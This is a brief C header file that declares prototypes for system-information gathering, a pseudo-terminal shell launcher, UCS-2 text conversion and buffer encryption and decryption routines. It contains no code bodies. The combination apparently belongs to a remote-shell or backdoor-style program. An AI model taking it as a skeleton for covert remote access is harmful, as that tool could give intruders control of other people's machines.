#ifndef	__cmfc_h
#define	__cmfc_h

#include <unistd.h>
#include <sys/utsname.h>
#include <wchar.h>
#include <iconv.h>

void cli_proc(int);
bool fetch_sysinfo(void *);
int pty_main(int, char *[]);
void startshell(int, int*);

void iconv_ucs2(wchar_t *, size_t *, char *, size_t *);
void encrypt_buf(char *, size_t);
void decrypt_buf(char *, size_t);

#endif